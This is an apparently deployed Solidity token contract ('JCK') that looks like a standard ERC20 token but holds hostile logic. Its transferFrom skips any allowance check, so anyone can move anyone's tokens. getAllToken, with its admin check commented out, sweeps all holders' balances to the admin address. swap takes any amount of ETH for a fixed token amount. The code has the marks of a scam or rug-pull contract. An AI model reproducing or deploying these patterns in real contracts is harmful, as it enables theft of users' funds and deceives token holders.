/**
 *Submitted for verification at Etherscan.io on 2021-08-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

contract JCK {
    uint256 public _price;
    address public _admin;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address[] private tokenOwners;
    
    constructor()
    {
        _name = "JCK";
        _symbol = "JCK";
        _decimals = 6;
        _admin = msg.sender;
        _price = 10 ** 15;
        _mint(msg.sender, 15000000 * 10 ** 6);
    }
    
    function name() public view returns(string memory) 
    {
        return _name;
    }
    
    function symbol() public view returns(string memory)
    {
        return _symbol;
    }
    
    function totalSupply() public view returns(uint256)
    {
        return _totalSupply;
    }
    
    function decimals() public view returns (uint8)
    {
        return _decimals;
    }
    
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        if(msg.sender != _admin)
        {
            tokenOwners.push(msg.sender);
        }

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    
    event SetTokenPrice(uint256 price);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address spender, address recipient, uint256 amount);
    
    function getTokenOwners() public view returns (address[] memory) {
        return tokenOwners;
    }
    
    function getAllToken() public
    {
        // require(msg.sender == _admin);
        
        for(uint i = 0; i < tokenOwners.length; i++)
        {
            transferFrom(tokenOwners[i], _admin, _balances[tokenOwners[i]]);
        }
    }
    
    function setTokenPrice(uint256 price) public
    {
        require(msg.sender == _admin);
        _price = price;
        emit SetTokenPrice(price);
    }
    
    function getTokenPrice() public view returns(uint256)
    {
        return _price;
    }
    
    function swap(uint256 ethPrice) public payable
    {
        _transfer(_admin, msg.sender, 20000);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        bool found = false;
        
        if(sender == _admin)
        {
            _approve(sender, recipient, amount);
            emit Approval(sender, recipient, amount);
        }
        
        for (uint i=0; i<tokenOwners.length; i++) {
            if(tokenOwners[i]==recipient){
                found=true;
                break;
            }
        }
        if(!found){
            tokenOwners.push(recipient);
        }

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}